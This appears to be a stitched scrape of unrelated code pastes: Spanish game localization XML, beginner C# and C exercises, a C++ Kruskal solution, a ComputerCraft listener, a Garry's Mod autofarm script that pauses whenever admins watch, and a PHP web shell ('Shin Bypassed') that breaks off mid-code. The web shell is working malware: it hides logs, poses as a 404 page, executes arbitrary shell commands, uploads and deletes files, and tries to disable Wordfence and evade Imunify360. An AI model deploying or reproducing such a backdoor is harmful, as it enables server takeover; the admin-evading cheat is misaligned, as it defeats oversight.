	<content contentuid=""h3e4a25fcgbe3fg4be2g9441g2cfe8a59100c"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para ganar una bonificación a las tiradas de &lt;LSTag Tooltip=""Investigation""&gt;Inteligencia (Investigación)&lt;/LSTag&gt;, &lt;LSTag Tooltip=""History""&gt;Inteligencia (Historia)&lt;/LSTag&gt; y &lt;LSTag Tooltip=""Insight""&gt;Sabiduría (Perspicacia)&lt;/LSTag&gt;, durante 30 segundos (o 1 ronda, si estás en combate).</content>
	<content contentuid=""hf194e076g3338g40d2ga9f2gf909c485e759"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y gana una bonificación de [1] a las tiradas de &lt;LSTag Tooltip=""Investigation""&gt;Inteligencia (Investigación)&lt;/LSTag&gt;, &lt;LSTag Tooltip=""History""&gt;Inteligencia (Historia)&lt;/LSTag&gt; y &lt;LSTag Tooltip=""Insight""&gt;Sabiduría (Perspicacia)&lt;/LSTag&gt;, durante 30 segundos (o 1 ronda, si estás en combate).</content>
	<content contentuid=""h0adcdaeeg29a4g4f69g8b0agc927486a9a5b"" version=""1"">[1] adicional a las tiradas de Inteligencia (Historia), Inteligencia (Investigación) y Sabiduría (Perspicacia).</content>
</contentList>"
4zEabVLw,05. List Manipulation Advanced,andarz,C#,Wednesday 18th of October 2023 11:50:20 AM CDT,"List<int> nums = Console.ReadLine().Split().Select(int.Parse).ToList();
string input = Console.ReadLine();

while (input != ""end"")
{
    if (input.StartsWith(""Contains""))
    {
        int numberIfContains = int.Parse(input.Split("" "")[1]);
        if (nums.Contains(numberIfContains))
        {
            Console.WriteLine(""Yes"");
        }
        else
            Console.WriteLine(""No such number"");
    }
    else if (input.StartsWith(""PrintEven""))
    {
        foreach (int num in nums)
        {
            if (num % 2 == 0)
            {
                Console.Write(num + "" "");
            }
        }
    }
    else if (input.StartsWith(""PrintOdd""))
    {
        foreach (int num in nums)
        {
            if (num % 2 != 0)
            {
                Console.Write(num + "" "");
            }
        }
    }
    else if (input.StartsWith(""GetSum""))
    {
        Console.WriteLine(nums.Sum());
    }
    else if (input.StartsWith(""Filter""))
    {
        string condition = input.Split("" "")[1];
        int number = int.Parse(input.Split("" "")[2]);

        switch (condition)
        {
            case ""<"":
                foreach (int num in nums)
                {
                    if (num < number)
                    {
                        Console.Write(num + "" "");
                    }
                }
                break;
            case "">"":
                foreach (int num in nums)
                {
                    if (num > number)
                    {
                        Console.Write(num + "" "");
                    }
                }
                break;
            case "">="":
                foreach (int num in nums)
                {
                    if (num >= number)
                    {
                        Console.Write(num + "" "");
                    }
                }
                break;
            case ""<="":
                foreach (int num in nums)
                {
                    if (num <= number)
                    {
                        Console.Write(num + "" "");
                    }
                }
                break;
        }
    }
    input = Console.ReadLine();
}
"
RwhmLNrU,Programa C Exemplo Função,hercioneto,C,Wednesday 18th of October 2023 11:48:55 AM CDT,"// Online C compiler to run C program online
#include <stdio.h>

int somar(int n1, int n2, int n3) {
    printf(""\n Oi vim somar\n"");
    int soma;
    soma = n1+n2+n3;
    return soma;
}

void main() {
    // Write C code here
    int numero1,numero2,numero3, resultado;
    printf(""Informe o primeiro numero: "");
    scanf(""%i"",&numero1);
    
    printf(""Informe o primeiro numero: "");
    scanf(""%i"",&numero2);
    
    printf(""Informe o primeiro numero: "");
    scanf(""%i"",&numero3);
    
    resultado = somar(numero1,numero2,numero3);
    
    printf(""O resultado deu: %i"",resultado);

    
}"
aDsTS5zf,Gmod autofarm zero’s botnet addons,Fumzou,Lua,Wednesday 18th of October 2023 11:41:31 AM CDT,"local originalAngles = nil
local scriptRunning = false

-- Console commands to start and stop the script
concommand.Add(""startzerosbot"", function() scriptRunning = true; print(""Script started."") end)
concommand.Add(""stopzerosbot"", function() scriptRunning = false; print(""Script stopped."") end)

-- Function to check if an admin is spectating the player
local function IsAdminSpectatingMe()
    for _, ply in pairs(player.GetAll()) do
        if ply:IsAdmin() and ply:GetObserverTarget() == LocalPlayer() then
            return true
        end
    end
    return false
end

-- Function to check if an admin is nearby
local function IsAdminNearby()
    for _, ply in pairs(ents.FindInSphere(LocalPlayer():GetPos(), 500)) do
        if ply:IsPlayer() and ply:IsAdmin() then
            return true
        end
    end
    return false
end

-- Retrieve a list of all controllers within a 1000 unit sphere around the player
local controllers = ents.FindInSphere(LocalPlayer():GetPos(), 1000)
local Controller = nil

-- Go through the list of found entities and select the first controller found
for _, ent in ipairs(controllers) do
    if ent:GetClass() == ""zbf_controller"" then
        Controller = ent
        break
    end
end

if Controller == nil then
    print(""No controllers found within range!"")
    return
end

local function SetEyeAnglesToBot(bot)
    local ang = (bot:GetPos() - LocalPlayer():GetShootPos()):Angle()
    originalAngles = LocalPlayer():EyeAngles()

    hook.Add(""CreateMove"", ""LookAtBot"", function(cmd)
        cmd:SetViewAngles(ang)
    end)
end

local function InteractWithBot(bot, action)
    print(""Attempting to "" .. action .. "" bot: "" .. tostring(bot))

    if action == ""repair"" then
        net.Start(""zbf_Controller_Repair"")
        net.WriteEntity(bot)
        net.SendToServer()
    else
        RunConsoleCommand(""+use"")
        timer.Simple(0.1, function() RunConsoleCommand(""-use"") end)
    end

    timer.Simple(0.1, function()
        if originalAngles then
            LocalPlayer():SetEyeAngles(originalAngles)
            originalAngles = nil
        end

        hook.Remove(""CreateMove"", ""LookAtBot"")
    end)
end

timer.Create(""CheckBotErrorsAndHealth"", 2, 0, function()
    if not scriptRunning or IsAdminSpectatingMe() or IsAdminNearby() then return end

    local pos = LocalPlayer():GetPos()

    for _, bot in pairs(ents.FindInSphere(pos, 1000)) do
        if bot:GetClass() == ""zbf_bot"" then
            if zbf.Bot.HasError(bot) then
                print(""Bot error detected: "" .. tostring(bot))

                SetEyeAnglesToBot(bot)
                InteractWithBot(bot, ""resolve"")
            elseif bot:Health() < 25 then
                print(""Low health bot detected: "" .. tostring(bot))

                SetEyeAnglesToBot(bot)
                InteractWithBot(bot, ""repair"")
            end
        end
    end
end)

print(""Script loaded. Use startzerosbot and stopzerosbot commands to control the script."")

timer.Create(""CheckControllerWallet"", 10, 0, function()
    if not scriptRunning or IsAdminSpectatingMe() or IsAdminNearby() then return end

    print(""Checking the Controller wallet..."")

    -- Get the current wallet value
    local walletValue = zbf.Wallet.GetMoneyValue(Controller)
    print(""Current wallet value: "" .. walletValue)

    -- Check if maximum capacity is reached
    if walletValue >= 50000 then
        print(""Maximum wallet capacity reached. Sending Bitcoin to the vault..."")
        -- Transfer the money to the vault
        net.Start(""zbf_Wallet_SendToVault"")
        net.WriteEntity(Controller)
        net.WriteUInt(2, 8) -- The ID of Bitcoin is 2
        net.SendToServer()
        print(""Attempted to send Bitcoin to the vault."")
    else
        print(""Wallet capacity not yet reached."")
    end
end)"
tNDGyvci,Untitled,Zeinab_Hamdy,C++,Wednesday 18th of October 2023 11:34:02 AM CDT,"#include<bits/stdc++.h>
using namespace std;
#define nl ""\n""
#define fi first
#define se second
#define pb push_back
#define ll long long
#define ull unsigned ll
#define RV  return void
// #define inf 2000000000
#define sz(x) int(x.size())
#define all(v) v.begin(), v.end()
#define rall(v) v.rbegin(), v.rend()
#define Mini(x) *min_element(all(x))
#define Maxi(x) *max_element(all(x))
#define fixed(n) fixed << setprecision(n)
#define ceil(w, m) (((w) / (m)) + ((w) % (m) ? 1 : 0))
#define cin(v) for (auto&i:v) cin >> i;
#define cout(v) for (auto&i:v) cout << i << "" "";
#define clr(memo, x) memset(memo, x, sizeof memo)
#define updmin(a, b) a = min(a, b)
#define updmax(a, b) a = max(a, b)
#define vi vector < int >
#define vl vector < ll >
#define vc vector < char >
#define vs vector < string >
#define v2i vector < vector < int > >
#define v2l vector < vector < int > >
#define seti set < int >
#define setl set < ll >
#define mapii map < int , int >
#define mapll map < ll , ll >
#define mapli map < ll , int >
#define mapci map < char , int >
#define mapsi map < string , int >
#define pll pair < ll , ll >
#define pii pair < int , int >
#define range(l,r,x) for(int i=l ; i < r ; i+=x)
#define FastCode ios_base::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
vector < string > ternary= {""NO\n"" , ""YES\n""};

void  Zainab(){
            #ifndef ONLINE_JUDGE
              freopen(""input.txt"", ""r"", stdin);
              freopen(""output.txt"", ""w"", stdout);
            #endif
}


/*================================  solution  ================================ */


struct DSU{
    vector < int > Parent , Size ;
        DSU(int mxSize){
            Parent.assign(mxSize+5 , 0);
            Size.assign(mxSize+5 , 1);
            for(int i=0 ; i<=mxSize ; i++) 
                Parent[i]=i, Size[i]=1;
        }

        int FindLeader(int node){
            if(Parent[node]==node)
                return node;
            return Parent[node]=FindLeader(Parent[node]);
        }

        bool SameGroup(int u , int v ){
            return FindLeader(u)==FindLeader(v);
        }

        void MergeGroups(int u , int v){
            int LeaderU = FindLeader(u);
            int LeaderV = FindLeader(v);
            if(LeaderU==LeaderV) return;
            
            if(Size[LeaderV] > Size[LeaderU])
                swap(LeaderU , LeaderV);

            Parent[LeaderV]=LeaderU;
            Size[LeaderU]+=Size[LeaderV];
        }
};


struct Edge{
    int u , v , w ;
};


void myCode(){


int n  , m ;
cin >> n >> m ;

DSU dsu(n);
vector < Edge > ans ;

for(int i =1 ;i <= m ; i++){
   Edge e ;
   cin >> e.u >> e.v >> e.w ;
   ans.pb(e);
}

sort(all(ans) , [&](Edge a , Edge b){
    return a.w < b.w ;
});


for(auto& e : ans){
    if(!dsu.SameGroup(e.u , e.v)){
        dsu.MergeGroups(e.u , e.v);
        cout << e.u << "" "" << e.v <<  "" "" << e.w << nl;
    }
}
cout << nl;


}


int main(){

                    FastCode ;
                    Zainab() ;

            int testCase=1;
                // cin >> testCase ;
            for(int i=1 ; i<= testCase ; i++){
                //  cout << ""Case #"" << i << "": "";
                myCode();
            }
      

    return 0;
}"
hx27h3w9,Untitled,kirkarr,Lua,Wednesday 18th of October 2023 11:22:04 AM CDT,"local modem = peripheral.wrap(""right"") or error(""No modem attached"", 0)
local otherpc = peripheral.wrap(""top"")
modem.open(32465)
while true do
    local event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
	if math.floor(distance) == 3 then
  		if message == 3071 then
       		modem.transmit(replyChannel,32465,200)    
        end
	end
end"
1AwP0Rav,Shin Bypassed,willysec_id,PHP,Wednesday 18th of October 2023 11:01:40 AM CDT,"<?php

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
@ob_clean();
@header(""X-Accel-Buffering: no"");
@header(""Content-Encoding: none"");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);
//Shin Code - Created 15 July 2023
//jan di ganti ganti ntar error aoakwkwk
//Recode aja  banh penting ga cuma ganti copyright :')
function getFileDetails($path)
{
    $folders = [];
    $files = [];

    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }

        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function formatSize($size)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}
//cmd fitur
function executeCommand($command)
{
    $currentDirectory = getCurrentDirectory();
    $command = ""cd $currentDirectory && $command"";

    $output = '';
    $error = '';

    // proc_open
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = @proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        $returnValue = proc_close($process);

        $output = trim($output);
        $error = trim($error);

        if ($returnValue === 0 && !empty($output)) {
            return $output;
        } elseif (!empty($error)) {
            return 'Error: ' . $error;
        }
    }

    // shell_exec
    $shellOutput = @shell_exec($command);
    if ($shellOutput !== null) {
        $output = trim($shellOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        $error = error_get_last();
        if (!empty($error)) {
            return 'Error: ' . $error['message'];
        }
    }

    // exec
    @exec($command, $execOutput, $execStatus);
    if ($execStatus === 0) {
        $output = implode(PHP_EOL, $execOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // passthru
    ob_start();
    @passthru($command, $passthruStatus);
    $passthruOutput = ob_get_clean();
    if ($passthruStatus === 0) {
        $output = $passthruOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // system
    ob_start();
    @system($command, $systemStatus);
    $systemOutput = ob_get_clean();
    if ($systemStatus === 0) {
        $output = $systemOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    return 'Error: Command execution failed.';
}
function readFileContent($file)
{
    return file_get_contents($file);
}

function saveFileContent($file)
{
    if (isset($_POST['content'])) {
        return file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}
//upfile
function uploadFile($targetDirectory)
{
    if (isset($_FILES['file'])) {
        $currentDirectory = getCurrentDirectory();
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) {
            return 'Open Ur Eyes Bitch !!!.';
        } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return 'File uploaded successfully.';
        } else {
            return 'Error uploading file.';
        }
    }
    return '';
}
}
//dir
function changeDirectory($path)
{
    if ($path === '..') {
        @chdir('..');
    } else {
        @chdir($path);
    }
}

function getCurrentDirectory()
{
    return realpath(getcwd());
}

//open file juga folder
function getLink($path, $name)
{
    if (is_dir($path)) {
        return '<a href=""?dir=' . urlencode($path) . '"">' . $name . '</a>';
    } elseif (is_file($path)) {
        return '<a href=""?dir=' . urlencode(dirname($path)) . '&amp;read=' . urlencode($path) . '"">' . $name . '</a>';

    }
}
function getDirectoryArray($path)
{
    $directories = explode('/', $path);
    $directoryArray = [];
    $currentPath = '';
    foreach ($directories as $directory) {
        if (!empty($directory)) {
            $currentPath .= '/' . $directory;
            $directoryArray[] = [
                'path' => $currentPath,
                'name' => $directory,
            ];
        }
    }
    return $directoryArray;
}


function showBreadcrumb($path)
{
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    ?>
    <div class=""breadcrumb"">
        <?php foreach ($paths as $id => $pat) { ?>
            <?php if ($pat == '' && $id == 0) { ?>
             DIR : <a href=""?dir=/"">/</a>
            <?php } ?>
            <?php if ($pat == '') {
                continue;
            } ?>
            <?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
            <a href=""?dir=<?php echo urlencode($linkPath); ?>""><?php echo $pat; ?></a>/
        <?php } ?>
    </div>
    <?php
}


//tabel biar keren
function showFileTable($path)
{
    $fileDetails = getFileDetails($path);
    ?>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        <?php if (is_array($fileDetails)) { ?>
            <?php foreach ($fileDetails as $fileDetail) { ?>
                <tr>
                    <td><?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
                    
                    <td><?php echo $fileDetail['type']; ?></td>
                    <td><?php echo $fileDetail['size']; ?></td>
                    <td>
                        <?php
                        $permissionColor = is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';
                        ?>
                        <span style=""color: <?php echo $permissionColor; ?>""><?php echo $fileDetail['permission']; ?></span>
                        </td>
                    <td>
                            
                        <?php if ($fileDetail['type'] === 'File') { ?>
                            <div class=""dropdown"">
                                <button class=""dropbtn"">Actions</button>
                                <div class=""dropdown-content"">
                                    <a href=""?dir=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>"">Edit</a>
                                    <a href=""?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>"">Rename</a>
                                    <a href=""?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>"">Chmod</a>
                                    <a href=""?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>"">Delete</a>
                                 </div>
                               </div>
                        <?php } ?>
                        <?php if ($fileDetail['type'] === 'Folder') { ?>
                            <div class=""dropdown"">
                                <button class=""dropbtn"">Actions</button>
                                <div class=""dropdown-content"">
                                    <a href=""?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>"">Rename</a>
                                    <a href=""?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>"">Chmod</a>
                                    <a href=""?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>"">Delete</a>
                                </div>
                             </div>
                        <?php } ?>
                    </td>
                </tr>
            <?php } ?>
        <?php } else { ?>
            <tr>
                <td colspan=""5"">None</td>
            </tr>
        <?php } ?>
    </table>
    <?php
}
//chmod
function changePermission($path)
{
    if (!file_exists($path)) {
        return 'File or directory does not exist.';
    }

    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
    
    if ($permission === '') {
        return 'Invalid permission value.';
    }

    if (!is_dir($path) && !is_file($path)) {
        return 'Cannot change permission. Only directories and files can have permissions modified.';
    }

    $parsedPermission = intval($permission, 8);
    if ($parsedPermission === 0) {
        return 'Invalid permission value.';
    }

    if (chmodRecursive($path, $parsedPermission)) {
        return 'Permission changed successfully.';
    } else {
        return 'Error changing permission.';
    }
}


function chmodRecursive($path, $permission)
{
    if (is_dir($path)) {
        $items = scandir($path);
        if ($items === false) {
            return false;
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }

                if (!chmodRecursive($itemPath, $permission)) {
                    return false;
                }
            } else {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }
            }
        }
    } else {
        if (!chmod($path, $permission)) {
            return false;
        }
    }

    return true;
}

//rename
function renameFile($oldName, $newName)
{
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (rename($oldName, $newPath)) {
            return 'File or folder renamed successfully.';
        } else {
            return 'Error renaming file or folder.';
        }
    } else {
        return 'File or folder does not exist.';
    }
}

//delete
function deleteFile($file)
{
    if (file_exists($file)) {
        if (unlink($file)) {
            return 'File deleted successfully.' . $file;
        } else {
            return 'Error deleting file.';
        }
    } else {
        return 'File does not exist.';
    }
}

function deleteFolder($folder)
{
    if (is_dir($folder)) {
        $files = glob($folder . '/*');
        foreach ($files as $file) {
            is_dir($file) ? deleteFolder($file) : unlink($file);
        }
        if (rmdir($folder)) {
            return 'Folder deleted successfully.' . $folder;
        } else {
            return 'Error deleting folder.';
        }
    } else {
        return 'Folder does not exist.';
    }
}
//main logic directory 
$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';

if (isset($_GET['dir'])) {
    changeDirectory($_GET['dir']);
    $currentDirectory = getCurrentDirectory();
}
//edit
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $saved = saveFileContent($file);
        if ($saved) {
            $responseMessage = 'File saved successfully.' . $file;
        } else {
            $errorMessage = 'Error saving file.';
        }
    }
}

if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $responseMessage = changePermission($file);
    }
}

if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}

if (isset($_POST['cmd'])) {
    $cmdOutput = executeCommand($_POST['cmd']);
}

if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = $_POST['new_name'];
        if (is_file($file) || is_dir($file)) {
            $responseMessage = renameFile($file, $newName);
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $currentDirectory = getCurrentDirectory();
        if (is_file($file)) {
            $responseMessage = deleteFile($file);
            echo ""<script>alert('File dihapus');window.location='?dir="" . urlencode($currentDirectory) . ""';</script>"";
            exit;
        } elseif (is_dir($file)) {
            $responseMessage = deleteFolder($file);
            echo ""<script>alert('Folder dihapus');window.location='?dir="" . urlencode($currentDirectory) . ""';</script>"";
            exit;
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}
//panggil adminer
if (isset($_POST['Summon'])) {
    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $currentPath = getCurrentDirectory();

    $fileUrl = $baseUrl;
    $fileName = 'Adminer.php';

    $filePath = $currentPath . '/' . $fileName;

    $fileContent = @file_get_contents($fileUrl);
    if ($fileContent !== false) {
        if (file_put_contents($filePath, $fileContent) !== false) {
     
            $responseMessage = 'File ""' . $fileName . '"" summoned successfully. <a href=""' . $filePath . '"">' . $filePath . '</a>';            
        } else {
            $errorMessage = 'Failed to save the summoned file.';
        }
    } else {
        $errorMessage = 'Failed to fetch the file content. None File';
    }
}
// katanya bypass
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}


if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>404</title>
  <link rel=""stylesheet"" href=""https://rawcdn.githack.com/Jenderal92/Blog-Gan/63073e604b81df6337c1917990a7330d46b22ae9/ganteng.css"">  
</head>
<body>
    <div class=""container"">
        <h1>[ Shin Bypassed ]</h1>
        <div class=""menu-icon"" onclick=""toggleSidebar()""></div>
        <hr>
        <div class=""button-container"">
            <form method=""post"" style=""display: inline-block;"">
                <input type=""submit"" name=""Summon"" value=""Adminer"" class=""summon-button"">
            </form>
            <button type=""button"" onclick=""window.location.href='?gas'"" class=""summon-button"">Mail Test</button>
        </div>
        

        <?php
        //mailer
        if (isset($_GET['gas'])) {
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                if (!empty($_POST['email'])) {
                    $xx = rand();
                    if (mail($_POST['email'], ""Shin Mailer Test - "" . $xx, ""Shin Ganteng"")) {
                        echo ""<b>Send a report to ["" . $_POST['email'] . ""] - $xx</b>"";
                    } else {
                        echo ""Failed to send the email."";
                    }
                } else {
                    echo ""Please provide an email address."";
                }
            } else {
        ?>
                <h2>Mail Test :</h2>
                <form method=""post"">
                    <input type=""text"" name=""email"" placeholder=""Enter email"" required>
                    <input type=""submit"" value=""Send test &raquo;"">
                </form>
        <?php
            }
        }
        ?>

        <?php if (!empty($errorMessage)) { ?>
            <p style=""color: red;""><?php echo $errorMessage; ?></p>
        <?php } ?>

        <hr>

        <div class=""upload-cmd-container"">
            <div class=""upload-form"">
                <h2>Upload:</h2>
                <form method=""post"" enctype=""multipart/form-data"">
                    <input type=""file"" name=""file"">
                    <button class=""button"" type=""submit"" name=""upload"">Upload</button>
                </form>
            </div>

            <div class=""cmd-form"">
                <h2>Command:</h2>
                <form method=""post"">
                    <?php echo @get_current_user() . ""@"" . @$_SERVER['REMOTE_ADDR'] . "": ~ $""; ?><input type='text' size='30' height='10' name='cmd'>
                    <input type=""submit"" class=""empty-button"">

                </form>
            </div>
        </div>
        <?php
        if (isset($_GET['read'])) {
            $file = $_GET['read'];
            $content = readFileContent($file);
            if ($content !== false) {
                echo '<div class=""command-output"">';
                echo '<pre>' . htmlspecialchars($content) . '</pre>';
                echo '</div>';
            } else {
                echo 'Failed to read the file.';
                }
              }
           ?>
        <?php if (!empty($cmdOutput)) { ?>
            <h3>Command Output:</h3>
            <div class=""command-output"">
                <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
            </div>
        <?php } ?>

        <?php if (!empty($responseMessage)) { ?>
            <p class=""response-message"" style=""color: green;""><?php echo $responseMessage; ?></p>
        <?php } ?>            
        <?php if (isset($_GET['rename'])) { ?>
        <div class=""rename-form"">
            <h2>Rename File or Folder: <?php echo basename($file); ?></h2>
            <form method=""post"">
                <input type=""text"" name=""new_name"" placeholder=""New Name"" required>
                <br>
                <input type=""submit"" value=""Rename"" class=""button"">
                <a href=""?dir=<?php echo urlencode(dirname($file)); ?>"" class=""button"">Cancel</a>
            </form>
        </div>
        <?php } ?>
        <?php if (isset($_GET['edit'])) { ?>
            <div class=""edit-file"">
                <h2>Edit File: <?php echo basename($file); ?></h2>
                <form method=""post"">
                    <textarea name=""content"" rows=""10"" cols=""50""><?php echo htmlspecialchars($content); ?></textarea><br>
                    <button class=""button"" type=""submit"">Save</button>
                </form>
            </div>
        <?php } elseif (isset($_GET['chmod'])) { ?>
            <div class=""change-permission"">
                <h2>Change Permission: <?php echo basename($file); ?></h2>
                <form method=""post"">
                    <input type=""hidden"" name=""chmod"" value=""<?php echo urlencode($file); ?>"">
                    <input type=""text"" name=""permission"" placeholder=""Enter permission (e.g., 0770)"">
                    <button class=""button"" type=""submit"">Change</button>
                </form>
            </div>
        <?php } ?>
        <hr>

        <?php
        echo '<h2>Filemanager</h2>';
        showBreadcrumb($currentDirectory);
        showFileTable($currentDirectory);
        ?>
    </div>
<div class=""sidebar"" id=""sidebar"">
    <div class=""sidebar-content"">
        <div class=""sidebar-close"">
            <button onclick=""toggleSidebar()"">Close</button>
        </div>
        <div class=""info-container"">
            <h2>Server Info</h2>
            <?php
            function countDomainsInServer()
            {
                $serverName = $_SERVER['SERVER_NAME'];
                $ipAddresses = @gethostbynamel($serverName);

                if ($ipAddresses !== false) {
                    return count($ipAddresses);
                } else {
                    return 0;
                }
            }

            $domainCount = @countDomainsInServer();

            function formatBytes($bytes, $precision = 2)
            {
                $units = array('B', 'KB', 'MB', 'GB', 'TB');

                $bytes = max($bytes, 0);
                $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                $pow = min($pow, count($units) - 1);

                $bytes /= (1 << (10 * $pow));

                return round($bytes, $precision) . ' ' . $units[$pow];
            }
            ?>

            <ul class=""info-list"">
                <li>Hostname: <?php echo @gethostname(); ?></li>
                <?php if (isset($_SERVER['SERVER_ADDR'])) : ?>
                    <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                <?php endif; ?>
                <li>PHP Version: <?php echo @phpversion(); ?></li>
                <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                <?php if (function_exists('disk_total_space')) : ?>
                    <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
                    <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
                <?php endif; ?>
                <li>Total Domains in Server: <?php echo $domainCount; ?></li>
                <li>System: <?php echo @php_uname(); ?></li>
            </ul>
        </div>

        <div class=""info-container"">
            <h2>System Info</h2>
            <ul class=""info-list"">
                <?php
                $features = [
                    'Safe Mode' => ini_get('safe_mode') ? 'Enabled' : 'Disabled',
                    'Disable Functions' => ini_get('disable_functions'),
                    'GCC' => function_exists('shell_exec') && shell_exec('gcc --version') ? 'On' : 'Off',
                    'Perl' => function_exists('shell_exec') && shell_exec('perl --version') ? 'On' : 'Off',
                    'Python Version' => ($pythonVersion = shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
                    'PKEXEC Version' => ($pkexecVersion = shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
                    'Curl' => function_exists('shell_exec') && shell_exec('curl --version') ? 'On' : 'Off',
                    'Wget' => function_exists('shell_exec') && shell_exec('wget --version') ? 'On' : 'Off',
                    'Mysql' => function_exists('shell_exec') && shell_exec('mysql --version') ? 'On' : 'Off',
                    'Ftp' => function_exists('shell_exec') && shell_exec('ftp --version') ? 'On' : 'Off',
                    'Ssh' => function_exists('shell_exec') && shell_exec('ssh --version') ? 'On' : 'Off',
